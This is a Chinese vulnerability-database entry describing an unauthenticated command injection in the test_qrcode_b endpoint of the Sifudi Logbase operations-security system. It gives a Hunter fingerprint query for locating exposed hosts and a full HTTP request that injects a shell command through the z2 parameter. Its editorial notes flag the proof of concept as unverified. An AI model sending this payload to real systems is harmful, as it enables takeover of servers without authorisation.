---
source: "wy876 漏洞文库"
title: "思福迪Logbase运维安全管理 test_qrcode_b z2命令注入"
product: "思福迪Logbase运维安全管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；Referer检查行为未解释"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cwhyqkk2t3hh660w"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Ftest_qrcode_b%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"Logbase 思福迪 运维安全系统\""
id: "vw-0cffbd478dea60bd93f3a01e"
entity_id: "ve-0cffbd478dea60bd93f3a01e"
schema_version: "1"
---

# 思福迪Logbase运维安全管理 test_qrcode_b z2命令注入

## 条目说明

- 对象与具体问题：思福迪Logbase运维安全管理；test_qrcode_b z2命令注入
- 版本、配置及部署条件：版本未知；Referer检查行为未解释
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 明确Referer不能删但样例值为空，需给检查逻辑/合法值规则而非只标存在
- 本篇![]()为空链接确实无目标
- 无文本命令结果/版本/修复，不能把图标指纹当漏洞证明

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
为满足用户对加强内部运维安全审计日益迫切的需要，杭州思福迪信息技术有限公司依托自身强大的研发能力，丰富的行业经验，自主研发了新一代软硬件一体化运维安全专用审计系统——Logbase运维安全管理系统。该系统支持对企业内部人员的维护行为进行全面的管理、审计，消除了传统审计系统中的盲点，使企业对运维人员的操作过程，能做到事前防范、事中控制、事后审计的能力，是企业IT内控最有效的运维管理平台。思福迪运维安全管理系统 test_qrcode_b存在远程命令执行漏洞，未经身份认证得攻击者可以通过此漏洞执行任意指令，造成服务器失陷。

## 二、影响版本
+ 思福迪运维安全管理系统

## 三、资产测绘
+ hunter`app.name="Logbase 思福迪 运维安全系统"`
+ 特征


## 四、漏洞复现
`referer`头不能删除

```http
POST /bhost/test_qrcode_b HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 23
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: 

z1=1&z2="|id;"&z3=bhost
```

> 请求长度说明：原资料 Content-Length 为 23；保留原始标头；其数值未据实际请求体重新计算或验证。

![]()


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cwhyqkk2t3hh660w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
